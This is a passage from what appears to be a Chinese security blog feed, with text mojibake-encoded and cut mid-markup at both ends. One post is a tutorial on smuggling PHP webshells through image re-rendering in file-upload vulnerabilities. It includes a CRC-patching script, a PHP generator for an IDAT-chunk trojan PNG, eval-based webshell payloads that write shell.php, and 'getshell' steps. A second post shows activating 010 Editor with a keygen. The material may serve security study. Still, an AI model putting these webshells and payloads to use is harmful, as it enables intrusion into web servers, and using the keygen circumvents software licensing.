src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2012.32.09.png" style="zoom:50%;"><ul><li>åœ¨å’Œä¸Šè¿°pngæ–‡ä»¶çš„åŒä¸€ä¸ªç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªcal_CRC.pyçš„è„šæœ¬æ–‡ä»¶ï¼š</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii<span class="token keyword">import</span> re png <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'smile_PLTE_php_yjh_sxk.png'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span>a <span class="token operator">=</span> png<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>png<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>hexstr <span class="token operator">=</span> binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token triple-quoted-string string">''' PLTE crc '''</span>data <span class="token operator">=</span>  <span class="token string">'504c5445'</span><span class="token operator">+</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'504c5445(.*?)49444154'</span><span class="token punctuation">,</span>hexstr<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>crc <span class="token operator">=</span> binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>è®¡ç®—<code>PLTEæ•°æ®å—</code>çš„<code>CRC</code>ï¼š</li></ul><pre class="line-numbers language-none"><code class="language-none">python2 cal_CRC.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2012.33.25.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x3bce23ce<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥å¾—å‡º<code>PLTEæ•°æ®å—</code>çš„<code>CRCçš„å€¼</code>ä¸ºï¼š<code>3bce23ce</code>ï¼š</p><ul><li>ä¿®æ”¹<code>PLTEæ•°æ®å—</code>çš„<code>CRCå€¼</code></li></ul><blockquote><p><strong>æ³¨ï¼šå¯ä»¥å…ˆæœç´¢<code>tRNS</code>ï¼Œå› ä¸º<code>PLTEæ•°æ®å—</code>çš„<code>CRCçš„å€¼</code>çš„å±æ€§å°±åœ¨<code>tRNSå—</code>çš„å‰é¢ï¼š</strong></p><p>ä½†æ˜¯ï¼š</p><ul><li>å¦‚æœPNGæ–‡ä»¶åŒ…å«PLTEå—å’ŒtRNSå—ï¼Œåˆ™<strong>tRNSå—å¿…é¡»ä½äºPLTEå—ä¹‹å</strong>ã€‚</li><li>PLTEå—çš„CRCå€¼ä½äºPLTEå—çš„æœ«å°¾ï¼Œä¸tRNSå—çš„ä½ç½®æ— å…³ã€‚</li></ul></blockquote><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2012.34.58.png" alt="åŸå§‹CRCæ ¡éªŒç " style="zoom:50%;"><p>å¦‚å›¾æ‰€ç¤ºçš„ä½ç½®å°±æ˜¯PLTEæ•°æ®å—çš„CRCæ ¡éªŒç ã€‚</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2012.36.42.png" style="zoom:50%;"><p>ä¿®æ”¹ä¹‹åå¦‚ä¸Šå›¾æ‰€ç¤ºã€‚</p><ul><li>ä¿å­˜ä¸Šä¼ </li></ul><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2012.26.52.png" style="zoom:50%;"><ul><li>å¦å­˜ä¸€ä¸‹</li></ul><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2012.38.33.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°æœ¨é©¬ç»è¿‡ç›®æ ‡ç½‘ç«™çš„äºŒæ¬¡æ¸²æŸ“ä¹‹åä»ç„¶å­˜åœ¨ã€‚</p><ul><li>getshell</li></ul><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2012.39.35.png" style="zoom:50%;"><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2012.40.13.png" style="zoom:40%;"><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2012.40.55.png" style="zoom:50%;"><p>BingGOï¼æˆåŠŸgetshellï¼</p><h3 id="5-3-2-ä½¿ç”¨phpè„šæœ¬å†™å…¥IDATæ•°æ®å—"><a href="#5-3-2-ä½¿ç”¨phpè„šæœ¬å†™å…¥IDATæ•°æ®å—" class="headerlink" title="5.3.2 ä½¿ç”¨phpè„šæœ¬å†™å…¥IDATæ•°æ®å—"></a>5.3.2 ä½¿ç”¨phpè„šæœ¬å†™å…¥IDATæ•°æ®å—</h3><ul><li>phpæœ¨é©¬ç”Ÿæˆè„šæœ¬</li></ul><p>åˆ›å»ºä¸€ä¸ª<code>IDAT_png.php</code>ï¼Œé€šè¿‡è¿™ä¸ªè„šæœ¬å¯ä»¥ç”Ÿæˆä¸€ä¸ªç»•è¿‡æ¸²æŸ“çš„å›¾ç‰‡é©¬ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span>           <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span>           <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span>           <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span>           <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>           <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span>           <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span>           <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$g</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">imagesetpixel</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'./1.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ç”Ÿæˆæœ¨é©¬</li></ul><p>ä¸éœ€è¦æŒ‡å®šåŸå§‹å›¾ç‰‡ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªç®€å•çš„pngæœ¨é©¬å›¾ç‰‡ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">php IDAT_png.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/1.png" alt="1" style="zoom:100%;"><p>ç”Ÿæˆ<code>1.png</code></p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2013.20.27.png" style="zoom:50%;"><ul><li>ä¸Šä¼ </li></ul><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2013.23.29.png" style="zoom:50%;"><p>æˆåŠŸä¸Šä¼ ã€‚</p><ul><li>å¦å­˜</li></ul><p>å¯ä»¥çœ‹åˆ°æœ¨é©¬ä»ç„¶å­˜åœ¨ã€‚</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2013.24.46.png" style="zoom:50%;"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>getshell</li></ul><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2013.25.55.png" style="zoom:50%;"><p>ä½†æ˜¯<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>æœ¨é©¬å¹¶ä¸å¥½åˆ©ç”¨ï¼Œä¼ é€’å‚æ•°ä¸æ–¹ä¾¿:</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2014.28.28.png" style="zoom:50%;"><p>å¯ä»¥åŸºäºå¯å˜å˜é‡å†™å…¥ä¸€ä¸ªæ–¹ä¾¿èšå‰‘è¿æ¥çš„ä¸€å¥è¯æœ¨é©¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">0</span><span class="token operator">=</span>assert //<span class="token variable"><span class="token variable">`</span>assert<span class="token variable">`</span></span> æ˜¯PHPä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºæ‰§è¡Œå­—ç¬¦ä¸²å½¢å¼çš„PHPä»£ç ã€‚<span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token variable">${fputs(fopen(base64_decode(â€˜c2hlbGwucGhwâ€™)<span class="token operator">,</span>w)<span class="token operator">,</span>base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjJ10pOyA<span class="token operator">/</span>Pg=='))}</span><span class="token punctuation">;</span>/*- è¿™æ˜¯ä¸€ä¸ªåŠ¨æ€ç”Ÿæˆçš„ä»£ç ç‰‡æ®µï¼Œç”¨äºåˆ›å»ºå¹¶å†™å…¥ä¸€ä¸ªPHPæ–‡ä»¶ã€‚- <span class="token variable"><span class="token variable">`</span>base64_decode<span class="token punctuation">(</span><span class="token string">'c2hlbGwucGhw'</span><span class="token punctuation">)</span><span class="token variable">`</span></span>ï¼šè§£ç åå¾—åˆ°å­—ç¬¦ä¸² <span class="token variable"><span class="token variable">`</span>shell.php<span class="token variable">`</span></span>ï¼Œè¿™æ˜¯è¦åˆ›å»ºçš„æ–‡ä»¶åã€‚- <span class="token variable"><span class="token variable">`</span>fopen<span class="token punctuation">(</span><span class="token string">'shell.php'</span>, <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token variable">`</span></span>ï¼šä»¥å†™å…¥æ¨¡å¼æ‰“å¼€ï¼ˆæˆ–åˆ›å»ºï¼‰æ–‡ä»¶ <span class="token variable"><span class="token variable">`</span>shell.php<span class="token variable">`</span></span>ã€‚- <span class="token variable"><span class="token variable">`</span>base64_decode<span class="token punctuation">(</span><span class="token string">'PD9waHAgQGV2YWwoJF9QT1NUWydjJ10pOyA/Pg=='</span><span class="token punctuation">)</span><span class="token variable">`</span></span>ï¼šè§£ç åå¾—åˆ°å­—ç¬¦ä¸² <span class="token variable"><span class="token variable">`</span><span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">&gt;</span><span class="token variable">`</span></span>ï¼Œè¿™æ˜¯è¦å†™å…¥æ–‡ä»¶çš„å†…å®¹ã€‚  - <span class="token variable"><span class="token variable">`</span><span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">&gt;</span><span class="token variable">`</span></span> æ˜¯ä¸€ä¸ªWeb Shellä»£ç ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡POSTå‚æ•° <span class="token variable"><span class="token variable">`</span>c<span class="token variable">`</span></span> æ‰§è¡Œä»»æ„PHPä»£ç ã€‚- <span class="token variable"><span class="token variable">`</span>fputs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token variable">`</span></span>ï¼šå°†è§£ç åçš„Web Shellä»£ç å†™å…¥ <span class="token variable"><span class="token variable">`</span>shell.php<span class="token variable">`</span></span> æ–‡ä»¶ã€‚*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¼ é€’å‚æ•°å†™å…¥shellï¼š</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2014.39.25.png" style="zoom:50%;"><p>è™½ç„¶æç¤ºé”™è¯¯ï¼Œä½†æ˜¯æˆåŠŸå†™å…¥äº†shell.php:</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2014.40.03.png" alt="è™½ç„¶æç¤ºé”™è¯¯ï¼Œä½†æ˜¯é™ˆå·¥å†™å…¥äº†shell.php" style="zoom:50%;"><p>èšå‰‘getshellï¼š</p><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2014.41.49.png" style="zoom:40%;"><img src="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/%E6%88%AA%E5%B1%8F2025-01-27%2014.43.13.png" alt="æˆåŠŸgetshell" style="zoom:50%;"><p>BingGoï¼æˆåŠŸgetsellï¼</p><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://blog.csdn.net/weixin_45588247/article/details/119177948">https://blog.csdn.net/weixin_45588247/article/details/119177948</a></p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼ æ¼æ´ </tag>
            
            <tag> äºŒæ¬¡æ¸²æŸ“ç»•è¿‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>010editoråå…­è¿›åˆ¶ç¼–è¾‘å™¨</title>
      <link href="/2025/01/23/qu-zheng-he-misc-gong-ju-ku/010editor-shi-liu-jin-zhi-bian-ji-qi/"/>
      <url>/2025/01/23/qu-zheng-he-misc-gong-ju-ku/010editor-shi-liu-jin-zhi-bian-ji-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€å·¥å…·ç®€ä»‹"><a href="#ä¸€ã€å·¥å…·ç®€ä»‹" class="headerlink" title="ä¸€ã€å·¥å…·ç®€ä»‹"></a>ä¸€ã€å·¥å…·ç®€ä»‹</h1><p>010 Editor æ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„æ–‡æœ¬å’ŒäºŒè¿›åˆ¶ç¼–è¾‘å™¨ï¼Œå¹¿æ³›åº”ç”¨äºè½¯ä»¶å¼€å‘ã€æ•°æ®åˆ†æå’Œé€†å‘å·¥ç¨‹ã€‚å®ƒæ”¯æŒæ–‡æœ¬å’Œåå…­è¿›åˆ¶è§†å›¾åˆ‡æ¢ï¼Œå…·å¤‡ç‹¬ç‰¹çš„äºŒè¿›åˆ¶æ¨¡æ¿æŠ€æœ¯ï¼Œå¯å¿«é€Ÿè§£æå¤æ‚æ–‡ä»¶æ ¼å¼ã€‚å†…ç½®è„šæœ¬ç¼–è¯‘å™¨æ”¯æŒ JavaScriptï¼Œèƒ½è‡ªåŠ¨åŒ–ç¼–è¾‘ä»»åŠ¡ã€‚æ­¤å¤–ï¼Œå®ƒæä¾›å¤šå…‰æ ‡ç¼–è¾‘ã€æ­£åˆ™è¡¨è¾¾å¼æŸ¥æ‰¾ã€äºŒè¿›åˆ¶æ¯”è¾ƒç­‰é«˜çº§åŠŸèƒ½ï¼Œé€‚åˆå¤„ç†æ—¥å¿—ã€é…ç½®æ–‡ä»¶å’ŒäºŒè¿›åˆ¶æ•°æ®ã€‚010 Editor æ”¯æŒ Windowsã€macOS å’Œ Linux ç³»ç»Ÿï¼Œå¹¶é€šè¿‡ä¸°å¯Œçš„æ’ä»¶æ‰©å±•åŠŸèƒ½ï¼Œæ˜¯å¼€å‘è€…å’Œé€†å‘å·¥ç¨‹å¸ˆçš„å¾—åŠ›å·¥å…·ã€‚</p><h1 id="äºŒã€å®‰è£…æ¿€æ´»"><a href="#äºŒã€å®‰è£…æ¿€æ´»" class="headerlink" title="äºŒã€å®‰è£…æ¿€æ´»"></a>äºŒã€å®‰è£…æ¿€æ´»</h1><ul><li>å·¥å…·æœ¬ä½“ç›´æ¥åˆ°å®˜ç½‘ä¸‹è½½å³å¯ï¼š</li></ul><p><a href="https://www.sweetscape.com/download/010editor/">https://www.sweetscape.com/download/010editor/</a></p><h2 id="2-1-æ¿€æ´»å·¥å…·ç”Ÿæˆæ¿€æ´»ç "><a href="#2-1-æ¿€æ´»å·¥å…·ç”Ÿæˆæ¿€æ´»ç " class="headerlink" title="2.1 æ¿€æ´»å·¥å…·ç”Ÿæˆæ¿€æ´»ç "></a>2.1 æ¿€æ´»å·¥å…·ç”Ÿæˆæ¿€æ´»ç </h2><ul><li>æ¿€æ´»å·¥å…·çš„é¡¹ç›®åœ°å€</li></ul><p><a href="https://github.com/garfield-ts/010Keygen">https://github.com/garfield-ts/010Keygen</a></p><ul><li>git clone åˆ°æœ¬åœ°</li></ul><img src="/2025/01/23/qu-zheng-he-misc-gong-ju-ku/010editor-shi-liu-jin-zhi-bian-ji-qi/%E6%88%AA%E5%B1%8F2025-01-23%2015.41.22.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> 010Keygen<span class="token comment"># ç”Ÿæˆæ³¨å†Œç ä¿¡æ¯</span>python3 keygen.py<span class="token comment"># æŒ‡å®šæ³¨å†Œç å‚æ•°</span>python3 keygen.py <span class="token parameter variable">-u</span> Admin <span class="token parameter variable">-n</span> <span class="token number">1</span> <span class="token parameter variable">-d</span> <span class="token number">2029</span>-12-31 <span class="token parameter variable">-t</span> 0xac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/23/qu-zheng-he-misc-gong-ju-ku/010editor-shi-liu-jin-zhi-bian-ji-qi/%E6%88%AA%E5%B1%8F2025-01-23%2015.45.46.png" style="zoom:50%;"><p>æˆ‘çš„pythonç‰ˆæœ¬æ˜¯ï¼š3.8.5æŠ¥é”™ä¿¡æ¯å¦‚ä¸Šã€‚</p><blockquote><h4 id="å¤§æˆ˜bug"><a href="#å¤§æˆ˜bug" class="headerlink" title="å¤§æˆ˜bug"></a>å¤§æˆ˜bug</h4><p>è¿™ä¸ªé”™è¯¯æ˜¯ç”±äº Python ç‰ˆæœ¬ä¸æ”¯æŒç±»å‹æ³¨è§£ä¸­çš„æ³›å‹è¯­æ³•ï¼ˆå¦‚ <code>list[str]</code>ï¼‰å¯¼è‡´çš„ã€‚åœ¨ Python 3.9 ä¹‹å‰ï¼Œè¿™ç§æ³›å‹è¯­æ³•æ˜¯ä¸è¢«æ”¯æŒçš„ï¼Œè€Œæ˜¯éœ€è¦é€šè¿‡ <code>typing</code> æ¨¡å—æ¥å®ç°ç±»ä¼¼çš„ç±»å‹æ³¨è§£ã€‚</p><p>é”™è¯¯å‘ç”Ÿåœ¨ <code>config.py</code> æ–‡ä»¶çš„ç¬¬ 37 è¡Œï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_name_list</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">list</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™é‡Œçš„ <code>list[str]</code> æ˜¯ Python 3.9+ å¼•å…¥çš„æ–°è¯­æ³•ï¼Œç”¨äºè¡¨ç¤ºå‡½æ•°è¿”å›å€¼æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ã€‚å¦‚æœä½ çš„ Python ç‰ˆæœ¬ä½äº 3.9ï¼Œå°±ä¼šæŠ¥å‡º <code>TypeError: 'type' object is not subscriptable</code> é”™è¯¯ã€‚</p><p>è§£å†³æ–¹æ³•</p><p>æ ¹æ®ä½ ä½¿ç”¨çš„ Python ç‰ˆæœ¬ï¼Œæœ‰ä»¥ä¸‹ä¸¤ç§è§£å†³æ–¹æ³•ï¼š</p><ul><li>æ–¹æ³• 1ï¼šå‡çº§ Python åˆ° 3.9 æˆ–æ›´é«˜ç‰ˆæœ¬</li></ul><p>å¦‚æœä½ çš„é¡¹ç›®å…è®¸ï¼Œå¯ä»¥ç›´æ¥å‡çº§ Python ç‰ˆæœ¬åˆ° 3.9 æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚è¿™æ ·å¯ä»¥ç›´æ¥æ”¯æŒè¿™ç§è¯­æ³•ã€‚</p><ul><li>æ–¹æ³• 2ï¼šä½¿ç”¨ <code>typing</code> æ¨¡å—ï¼ˆé€‚ç”¨äº Python 3.5-3.8ï¼‰</li></ul><p>å¦‚æœä½ æ— æ³•å‡çº§ Python ç‰ˆæœ¬ï¼Œå¯ä»¥ä½¿ç”¨ <code>typing</code> æ¨¡å—æ¥æ›¿ä»£ã€‚ä¿®æ”¹ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> typing <span class="token keyword">import</span> List<span class="token keyword">def</span> <span class="token function">get_name_list</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·å¯ä»¥å…¼å®¹ Python 3.5-3.8 çš„ç‰ˆæœ¬ã€‚</p><p>æˆ‘è¿™é‡Œé€‰æ‹©ç¬¬äºŒç§æ–¹æ³•ã€‚</p><p>ä¿®æ”¹çš„å†…å®¹ï¼šconfig.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> typing <span class="token keyword">import</span> Optional<span class="token punctuation">,</span>List<span class="token punctuation">,</span>Dict <span class="token comment"># å¯¼å…¥Listå’ŒDict</span><span class="token comment"># ç„¶ååœ¨æŠ¥é”™çš„ä»£ç å°†listæ”¹æˆListï¼Œdictæ”¹æˆDict</span><span class="token keyword">def</span> <span class="token function">get_name_list</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> List<span class="token punctuation">[</span><span class="token 